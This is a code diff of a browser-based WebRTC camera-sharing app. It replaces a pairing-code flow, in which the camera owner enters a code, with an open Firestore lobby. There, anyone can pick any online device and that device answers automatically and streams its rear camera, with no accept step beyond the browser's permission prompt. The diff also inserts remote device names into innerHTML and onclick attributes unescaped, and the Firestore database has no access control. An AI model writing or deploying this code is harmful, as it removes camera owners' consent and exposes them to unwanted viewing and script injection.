@@ -2,81 +2,65 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PeerCam Connect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PeerCam Net</title>
     <!-- Tailwind CSS for styling -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #0b0f19; color: #f3f4f6; font-family: system-ui, -apple-system, sans-serif; }
-        .glass { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        body { background: #0b0f19; color: #f3f4f6; font-family: system-ui, -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; }
+        .glass { background: rgba(17, 24, 39, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
     </style>
 </head>
 <body class="min-h-screen flex flex-col items-center justify-center p-4">
 
     <div class="w-full max-w-md glass rounded-2xl p-6 shadow-2xl space-y-6">
         <div class="text-center">
-            <h1 class="text-2xl font-bold tracking-tight text-cyan-400">PeerCam Connect</h1>
-            <p class="text-xs text-gray-400 mt-1">Stream camera feeds securely across local devices via pairing codes</p>
-        </div>
-
-        <!-- Mode Selection View -->
-        <div id="setup-view" class="space-y-4">
-            <div class="grid grid-cols-2 gap-3">
-                <button onclick="app.selectRole('viewer')" class="p-4 rounded-xl glass hover:bg-cyan-950/40 border border-cyan-500/30 text-center transition font-medium">
-                    <span class="block text-cyan-400 text-lg mb-1">📱</span>
-                    Watch / Receive
-                </button>
-                <button onclick="app.selectRole('camera')" class="p-4 rounded-xl glass hover:bg-indigo-950/40 border border-indigo-500/30 text-center transition font-medium">
-                    <span class="block text-indigo-400 text-lg mb-1">📷</span>
-                    Share Camera
-                </button>
+            <h1 class="text-2xl font-bold tracking-tight text-cyan-400">PeerCam Net</h1>
+            <p class="text-xs text-gray-400 mt-1">Select any online device to request its camera feed</p>
+            <div id="my-identity" class="mt-3 inline-block px-3 py-1.5 bg-cyan-950/60 border border-cyan-500/30 rounded-xl text-cyan-300 font-mono text-xs font-semibold">
+                Your ID: Loading...
             </div>
         </div>
 
-        <!-- Viewer View (Device A) -->
-        <div id="viewer-view" class="hidden space-y-4">
-            <div id="code-generator" class="text-center space-y-3">
-                <p class="text-sm text-gray-300">Click below to generate a secure pairing code:</p>
-                <button onclick="app.generateSession()" class="w-full py-3 bg-cyan-600 hover:bg-cyan-500 rounded-xl font-semibold shadow-lg transition">Generate Pairing Code</button>
-            </div>
-            <div id="pairing-display" class="hidden text-center space-y-2">
-                <p class="text-xs text-gray-400 uppercase tracking-widest">Your Code</p>
-                <div id="code-box" class="text-4xl font-mono font-bold tracking-widest text-cyan-300 py-3 bg-black/40 rounded-xl border border-cyan-500/20">----</div>
-                <p id="connection-status" class="text-xs text-yellow-400 animate-pulse">Waiting for remote device to connect...</p>
-            </div>
-            <div id="remote-stream-container" class="hidden space-y-3">
-                <div class="relative rounded-xl overflow-hidden bg-black aspect-[3/4] border border-white/10">
-                    <video id="remoteVideo" autoplay playsinline class="w-full h-full object-cover"></video>
+        <!-- Lobby View (Device Selector) -->
+        <div id="lobby-view" class="space-y-4">
+            <div class="space-y-2">
+                <p class="text-sm font-medium text-gray-300">Available Online Devices:</p>
+                <div id="device-list" class="space-y-2 max-h-72 overflow-y-auto pr-1">
+                    <p class="text-xs text-gray-500 text-center py-8">Scanning for online devices...</p>
                 </div>
-                <button onclick="location.reload()" class="w-full py-2 bg-red-600/80 hover:bg-red-600 rounded-xl text-sm font-medium transition">Disconnect</button>
             </div>
         </div>
 
-        <!-- Camera Provider View (Device B) -->
-        <div id="camera-view" class="hidden space-y-4">
-            <div id="code-input-box" class="space-y-3">
-                <p class="text-sm text-gray-300">Enter the 4-digit code shown on the viewing device:</p>
-                <input type="text" id="codeInput" maxlength="4" placeholder="1234" class="w-full text-center text-3xl font-mono tracking-widest bg-black/50 border border-white/20 rounded-xl py-3 text-white focus:outline-none focus:border-indigo-500 uppercase">
-                <button onclick="app.connectWithCode()" class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 rounded-xl font-semibold shadow-lg transition">Connect & Stream Camera</button>
+        <!-- Active Stream View (Viewer) -->
+        <div id="viewer-active-view" class="hidden space-y-4">
+            <div class="p-2 bg-green-950/40 border border-green-500/30 rounded-xl text-green-400 text-xs font-medium text-center">
+                🟢 Streaming Live Camera Feed!
             </div>
-            <div id="streaming-active" class="hidden text-center space-y-3">
-                <div class="p-3 bg-green-950/40 border border-green-500/30 rounded-xl text-green-400 text-sm font-medium">
-                    🟢 Camera broadcasting successfully!
-                </div>
-                <div class="relative rounded-xl overflow-hidden bg-black aspect-[3/4] border border-white/10">
-                    <video id="localVideo" autoplay muted playsinline class="w-full h-full object-cover"></video>
-                </div>
-                <button onclick="location.reload()" class="w-full py-2 bg-red-600/80 hover:bg-red-600 rounded-xl text-sm font-medium transition">Stop Streaming</button>
+            <div class="relative rounded-xl overflow-hidden bg-black aspect-[3/4] border border-white/10 shadow-inner">
+                <video id="remoteVideo" autoplay playsinline class="w-full h-full object-cover"></video>
             </div>
+            <button onclick="location.reload()" class="w-full py-3 bg-red-600/80 hover:bg-red-600 rounded-xl text-sm font-medium transition">Disconnect</button>
+        </div>
+
+        <!-- Active Stream View (Camera Provider) -->
+        <div id="camera-active-view" class="hidden space-y-4">
+            <div class="p-2 bg-indigo-950/40 border border-indigo-500/30 rounded-xl text-indigo-300 text-xs font-medium text-center">
+                🟢 Broadcasting your camera to a remote viewer!
+            </div>
+            <div class="relative rounded-xl overflow-hidden bg-black aspect-[3/4] border border-white/10 shadow-inner">
+                <video id="localVideo" autoplay muted playsinline class="w-full h-full object-cover"></video>
+            </div>
+            <button onclick="location.reload()" class="w-full py-3 bg-red-600/80 hover:bg-red-600 rounded-xl text-sm font-medium transition">Stop Streaming</button>
         </div>
     </div>
 
     <!-- Firebase Signaling Script -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, doc, setDoc, getDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, collection, doc, setDoc, getDoc, updateDoc, onSnapshot, deleteDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // TODO: Replace these fields with your actual Firebase project credentials
+        // TODO: Replace with your actual Firebase project credentials
         const firebaseConfig = {
             apiKey: "YOUR_FIREBASE_API_KEY",
             authDomain: "YOUR_PROJECT.firebaseapp.com",
@@ -90,44 +74,85 @@
         const db = getFirestore(appFB);
 
         const pcConfig = {
-            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' },
+                { urls: 'stun:stun.stunprotocol.org:3478' }
+            ]
         };
 
-        class PeerCamApp {
+        // Fun, regular word combinations instead of robotic tech names
+        const adjectives = ["Happy", "Brave", "Lucky", "Silly", "Cool", "Fast", "Super", "Clever", "Wild", "Sunny", "Mighty", "Quick"];
+        const nouns = ["Potato", "Turtle", "Monkey", "Pancake", "Rocket", "Ninja", "Wizard", "Cookie", "Bandit", "Panda", "Shark", "Dragon"];
+        const regularCodename = `${adjectives[Math.floor(Math.random() * adjectives.length)]}-${nouns[Math.floor(Math.random() * nouns.length)]}-${Math.floor(10 + Math.random() * 90)}`;
+
+        class PeerCamNetApp {
             constructor() {
-                this.role = null;
+                this.deviceId = 'dev_' + regularCodename.toLowerCase();
+                this.deviceName = regularCodename;
                 this.pc = null;
                 this.localStream = null;
-                this.sessionCode = null;
-                this.unsubscribe = null;
+                this.lobbyUnsubscribe = null;
+                this.callUnsubscribe = null;
+                
+                document.getElementById('my-identity').innerText = `Your Device: ${this.deviceName}`;
+                this.initApp();
             }
 
-            selectRole(role) {
-                this.role = role;
-                document.getElementById('setup-view').classList.add('hidden');
-                if (role === 'viewer') {
-                    document.getElementById('viewer-view').classList.remove('hidden');
-                } else {
-                    document.getElementById('camera-view').classList.remove('hidden');
-                }
+            async initApp() {
+                const deviceRef = doc(db, 'devices', this.deviceId);
+                await setDoc(deviceRef, {
+                    id: this.deviceId,
+                    name: this.deviceName,
+                    status: 'online',
+                    lastSeen: Date.now()
+                });
+
+                this.startLobbyListener();
+                this.listenForIncomingCalls();
             }
 
-            async generateSession() {
-                this.sessionCode = Math.floor(1000 + Math.random() * 9000).toString();
-                document.getElementById('code-generator').classList.add('hidden');
-                document.getElementById('pairing-display').classList.remove('hidden');
-                document.getElementById('code-box').innerText = this.sessionCode;
+            startLobbyListener() {
+                this.lobbyUnsubscribe = onSnapshot(collection(db, 'devices'), (snapshot) => {
+                    const listEl = document.getElementById('device-list');
+                    listEl.innerHTML = '';
+                    let foundOthers = false;
+
+                    snapshot.forEach((docSnap) => {
+                        const data = docSnap.data();
+                        if (data.id === this.deviceId) return; // Skip self
+
+                        foundOthers = true;
+                        listEl.innerHTML += `
+                            <div class="flex items-center justify-between p-3.5 bg-black/40 border border-white/10 rounded-xl">
+                                <div>
+                                    <p class="text-sm font-semibold text-white">📱 ${data.name}</p>
+                                    <p class="text-[10px] text-cyan-400">Online & Ready</p>
+                                </div>
+                                <button onclick="app.connectToDevice('${data.id}', '${data.name}')" class="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 rounded-lg text-xs font-semibold transition active:scale-95 shadow-lg">View Camera</button>
+                            </div>
+                        `;
+                    });
+
+                    if (!foundOthers) {
+                        listEl.innerHTML = `<p class="text-xs text-gray-500 text-center py-8">No other devices online yet. Open this link on a second device or phone!</p>`;
+                    }
+                });
+            }
+
+            async connectToDevice(targetId, targetName) {
+                if (this.lobbyUnsubscribe) this.lobbyUnsubscribe();
+
+                document.getElementById('lobby-view').classList.add('hidden');
+                document.getElementById('viewer-active-view').classList.remove('hidden');
 
                 this.pc = new RTCPeerConnection(pcConfig);
                 
                 this.pc.ontrack = (event) => {
-                    document.getElementById('connection-status').innerText = "Connected!";
-                    document.getElementById('pairing-display').classList.add('hidden');
-                    document.getElementById('remote-stream-container').classList.remove('hidden');
                     document.getElementById('remoteVideo').srcObject = event.streams[0];
                 };
 
-                const sessionDocRef = doc(db, 'sessions', this.sessionCode);
+                const sessionDocRef = doc(db, 'calls', this.deviceId + '_to_' + targetId);
                 const offerCandidates = [];
 
                 this.pc.onicecandidate = (event) => {
@@ -139,18 +164,17 @@
                 const offerDescription = await this.pc.createOffer();
                 await this.pc.setLocalDescription(offerDescription);
 
-                const offer = {
-                    sdp: offerDescription.sdp,
-                    type: offerDescription.type,
-                };
+                await setDoc(sessionDocRef, {
+                    viewerId: this.deviceId,
+                    targetCameraId: targetId,
+                    offer: { sdp: offerDescription.sdp, type: offerDescription.type },
+                    offerCandidates
+                });
 
-                await setDoc(sessionDocRef, { offer, offerCandidates });
-
-                this.unsubscribe = onSnapshot(sessionDocRef, async (snapshot) => {
+                this.callUnsubscribe = onSnapshot(sessionDocRef, async (snapshot) => {
                     const data = snapshot.data();
                     if (!this.pc.currentRemoteDescription && data?.answer) {
-                        const answerDescription = new RTCSessionDescription(data.answer);
-                        await this.pc.setRemoteDescription(answerDescription);
+                        await this.pc.setRemoteDescription(new RTCSessionDescription(data.answer));
                     }
                     if (data?.answerCandidates) {
                         data.answerCandidates.forEach(async (candidate) => {
@@ -160,75 +184,60 @@
                         });
                     }
                 });
-
-                setTimeout(async () => {
-                    if (offerCandidates.length > 0) {
-                        await updateDoc(sessionDocRef, { offerCandidates });
-                    }
-                }, 1000);
             }
 
-            async connectWithCode() {
-                const code = document.getElementById('codeInput').value.trim();
-                if (code.length !== 4) {
-                    alert('Please enter a valid 4-digit code.');
-                    return;
-                }
+            listenForIncomingCalls() {
+                onSnapshot(collection(db, 'calls'), async (snapshot) => {
+                    snapshot.forEach(async (docSnap) => {
+                        const data = docSnap.data();
+                        if (data.targetCameraId === this.deviceId && !this.pc) {
+                            
+                            try {
+                                this.localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+                            } catch (err) {
+                                alert('Camera permission is required to stream when selected.');
+                                return;
+                            }
 
-                const sessionDocRef = doc(db, 'sessions', code);
-                const sessionSnap = await getDoc(sessionDocRef);
+                            if (this.lobbyUnsubscribe) this.lobbyUnsubscribe();
+                            document.getElementById('lobby-view').classList.add('hidden');
+                            document.getElementById('camera-active-view').classList.remove('hidden');
+                            document.getElementById('localVideo').srcObject = this.localStream;
 
-                if (!sessionSnap.exists()) {
-                    alert('Invalid code or session expired.');
-                    return;
-                }
+                            this.pc = new RTCPeerConnection(pcConfig);
+                            this.localStream.getTracks().forEach((track) => this.pc.addTrack(track, this.localStream));
 
-                document.getElementById('code-input-box').classList.add('hidden');
-                document.getElementById('streaming-active').classList.remove('hidden');
+                            const answerCandidates = [];
+                            this.pc.onicecandidate = (event) => {
+                                if (event.candidate) {
+                                    answerCandidates.push(event.candidate.toJSON());
+                                }
+                            };
 
-                try {
-                    this.localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-                    document.getElementById('localVideo').srcObject = this.localStream;
-                } catch (err) {
-                    alert('Camera permission denied or unavailable.');
-                    location.reload();
-                    return;
-                }
+                            await this.pc.setRemoteDescription(new RTCSessionDescription(data.offer));
+                            const answerDescription = await this.pc.createAnswer();
+                            await this.pc.setLocalDescription(answerDescription);
 
-                this.pc = new RTCPeerConnection(pcConfig);
-                this.localStream.getTracks().forEach((track) => this.pc.addTrack(track, this.localStream));
+                            const sessionDocRef = doc(db, 'calls', docSnap.id);
+                            await updateDoc(sessionDocRef, {
+                                answer: { type: answerDescription.type, sdp: answerDescription.sdp },
+                                answerCandidates
+                            });
 
-                const answerCandidates = [];
-                this.pc.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        answerCandidates.push(event.candidate.toJSON());
-                    }
-                };
-
-                const sessionData = sessionSnap.data();
-                await this.pc.setRemoteDescription(new RTCSessionDescription(sessionData.offer));
-
-                const answerDescription = await this.pc.createAnswer();
-                await this.pc.setLocalDescription(answerDescription);
-
-                const answer = {
-                    type: answerDescription.type,
-                    sdp: answerDescription.sdp
-                };
-
-                await updateDoc(sessionDocRef, { answer, answerCandidates });
-
-                if (sessionData.offerCandidates) {
-                    sessionData.offerCandidates.forEach(async (candidate) => {
-                        try {
-                            await this.pc.addIceCandidate(new RTCIceCandidate(candidate));
-                        } catch (e) { console.error(e); }
+                            if (data.offerCandidates) {
+                                data.offerCandidates.forEach(async (candidate) => {
+                                    try {
+                                        await this.pc.addIceCandidate(new RTCIceCandidate(candidate));
+                                    } catch (e) { console.error(e); }
+                                });
+                            }
+                        }
                     });
-                }
+                });
             }
         }
 
-        window.app = new PeerCamApp();
+        window.app = new PeerCamNetApp();
     </script>
 </body>
 </html>
